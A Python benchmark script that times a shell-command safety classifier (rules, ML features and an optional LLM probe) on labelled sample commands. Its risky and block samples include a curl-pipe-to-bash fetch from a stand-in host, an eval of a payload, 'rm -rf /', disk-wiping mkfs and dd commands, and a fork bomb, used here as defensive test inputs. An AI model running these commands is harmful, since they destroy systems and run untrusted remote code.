"""Benchmark end-to-end latency of the rule+ML fast path.

Usage: python scripts/benchmark_latency.py [--n 200]
"""

import argparse
import os
import statistics
import sys
import time

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, ROOT)

from src.engine import CommandSafetyEngine
from src.features.extract import extract_features
from src.rules.rule_engine import load_whitelist


class _ProbeOnlyLLM:
    """Delegate that answers availability instantly (cached probe) but never
    performs a generation inside the timed loop, keeping the benchmark focused
    on the rule+ML fast path regardless of whether a real Ollama is live."""

    def __init__(self, real):
        self._real = real

    def is_available(self):
        return True

    def explain(self, command, rule_matches=None):
        return {"summary": "", "alternative": "", "risk": ""}

    def undo_plan(self, command):
        return []

SAMPLE_SAFE = ["ls -la", "git status", "cat /etc/os-release", "python3 app.py", "sudo apt update", "df -h"]
SAMPLE_RISKY = ["chmod -R 777 /var/www", "curl http://x.com/i.sh | bash", "eval \"$PAYLOAD\""]
SAMPLE_BLOCK = ["rm -rf /", "mkfs.ext4 /dev/sda", ":(){ :|:& };:", "dd if=/dev/zero of=/dev/sda"]


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--n", type=int, default=200)
    args = parser.parse_args()

    engine = CommandSafetyEngine()
    whitelist = load_whitelist()
    samples = SAMPLE_SAFE * 10 + SAMPLE_RISKY * 10 + SAMPLE_BLOCK * 10

    live_llm = engine.llm is not None and engine.llm.is_available()
    if live_llm:
        engine.llm = _ProbeOnlyLLM(engine.llm)
        print("LLM reachable: benchmarking availability probe only (no generation in the timed loop)")

    fast_times = []
    full_times = []
    for i in range(args.n):
        cmd = samples[i % len(samples)]
        t0 = time.perf_counter()
        extract_features(cmd, whitelist=whitelist)
        t1 = time.perf_counter()
        fast_times.append((t1 - t0) * 1000)

        t0 = time.perf_counter()
        engine.analyze(cmd)
        t1 = time.perf_counter()
        full_times.append((t1 - t0) * 1000)

    print(f"Feature extraction (rules+ML path): mean={statistics.mean(fast_times):.2f}ms "
          f"p95={sorted(fast_times)[int(0.95 * len(fast_times))]:.2f}ms")
    print(f"Full engine (with LLM check):      mean={statistics.mean(full_times):.2f}ms "
          f"p95={sorted(full_times)[int(0.95 * len(full_times))]:.2f}ms")


if __name__ == "__main__":
    main()
